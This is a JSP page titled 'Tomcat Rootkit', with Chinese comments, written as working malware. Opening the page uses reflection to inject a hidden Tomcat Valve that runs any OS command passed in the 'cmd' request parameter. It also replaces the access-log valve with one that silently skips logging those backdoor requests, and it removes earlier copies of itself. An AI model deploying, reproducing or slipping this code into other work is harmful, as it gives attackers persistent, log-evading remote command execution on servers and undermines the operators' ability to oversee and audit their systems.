<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<%@ page import="java.lang.reflect.Field"%>
<%@page import="org.apache.catalina.connector.Request"%>
<%@page import="org.apache.catalina.connector.Response"%>
<%@page import="org.apache.catalina.Host"%>
<%@page import="org.apache.catalina.Pipeline"%>
<%@page import="java.io.*"%>
<%@page import="org.apache.catalina.valves.AccessLogValve"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Tomcat Rootkit</title>
</head>

<%
	Field requestField = request.getClass().getDeclaredField("request");
	requestField.setAccessible(true);
	Request req = (Request) requestField.get(request);
	Host host = req.getHost();
	Pipeline hostPipleline = host.getPipeline();
	
	Field firstField = hostPipleline.getClass().getDeclaredField("first");
	firstField.setAccessible(true);
	//org.apache.catalina.Valve firstValue = firstField.get(hostPipleline);

	//后门 rootkit
	org.apache.catalina.Valve rootkitValue = new org.apache.catalina.valves.ValveBase() {
		public void invoke(Request request, Response response) throws IOException, ServletException {
			String op = request.getParameter("op");
			String cmd = request.getParameter("cmd");
			if ("rootkit".equals(op) && cmd != null) {
				response.setContentType("text/html");
				response.setCharacterEncoding("utf-8");
				response.getWriter().write(execCmd(cmd));
				response.finishResponse();
				return;
			}
			this.getNext().invoke(request, response);
		}
		
		public String execCmd(String cmd){
			StringBuffer result  = new StringBuffer();
			try{
				BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream(),"GBK"));
				String line = null;
				while((line = br.readLine()) != null){
					result.append(line + "<br/>");
				}
				br.close();
			}catch(Exception e){
				return "error";
			}
			return result.toString();
		}

		public String toString() {
			return "rootkit";
		}
	};
	
	//消除访问记录的AccessLogValue对象
	org.apache.catalina.Valve accessLogValue = new org.apache.catalina.valves.AccessLogValve(){
		public void log(Request request, Response response, long time) {
			String op = request.getParameter("op");
			if("rootkit".equals(op)){
				return;
			}else{
				super.log(request, response, time);
			}
		}
		
		public String toString() {
			return "alvrootkit";
		}
	};
	
	//删除默认的accesslogvalue对象并安装修改之后的alv对象
	//hostPipleline.removeValve(hostPipleline.getFirst());
	//删除久rootkit
	org.apache.catalina.Valve[] vs = hostPipleline.getValves();
	for (int i = 0;i < vs.length;i++) {
		org.apache.catalina.Valve v = vs[i];
		System.out.println(v.getClass().getName());
		if ("rootkit".equals(v.toString())) {
			hostPipleline.removeValve(v);
			out.write("remove old rootkit:" + v + "<br/>");
		}
		if("org.apache.catalina.valves.AccessLogValve".equals(v.getClass().getName())){
			//hostPipleline.removeValve(v);
			System.out.println("asdfasdf");
			org.apache.catalina.Valve n = v.getNext();
			firstField.set(hostPipleline, accessLogValue);
			accessLogValue.setNext(n);
			out.write("remove AccessLogValue:" + v + " and deploy alvrootkit:" + accessLogValue + "<br/>");
		}
	}
	//if(hostPipleline.getFirst() == null)

	hostPipleline.addValve(rootkitValue);
	out.write("add rootkit:" + rootkitValue + "<br/>");
%>
<body>
</body>
</html>